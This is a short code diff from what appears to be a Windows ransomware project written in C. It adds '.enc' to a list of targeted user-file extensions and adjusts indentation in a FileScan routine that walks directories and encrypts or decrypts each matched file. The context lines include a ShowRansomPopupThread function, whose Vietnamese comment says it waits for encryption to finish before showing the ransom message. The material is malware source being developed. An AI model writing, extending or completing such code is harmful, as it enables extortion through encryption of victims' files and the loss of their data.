@@ -25,7 +25,8 @@ const char* userExtensions[] = {
     ".psd", ".ai", ".dwg", ".dxf",
     ".pem", ".key",
     ".iso", ".vmdk", ".vdi", ".vhd",
-    ".pst", ".ost", ".msg", ".eml"
+    ".pst", ".ost", ".msg", ".eml",
+    ".enc"
 };
 DWORD WINAPI ShowRansomPopupThread(LPVOID lpParam) {
     // Đợi 2 giây để encryption hoàn tất và file được flush
@@ -210,7 +211,7 @@ void FileScan(bool decryptMode) {
                     } else {
                         sprintf(path, "%s%s", currentParentPath, ffd.cFileName);
                         if (!isUserDataFile(path)) continue;
-                          long long fileSize = ((long long)ffd.nFileSizeHigh << 32 | ffd.nFileSizeLow);
+                        long long fileSize = ((long long)ffd.nFileSizeHigh << 32 | ffd.nFileSizeLow);
                         if (decryptMode) {
                             FileDecrypt(path, hProv, hAesKey);
                         } else {
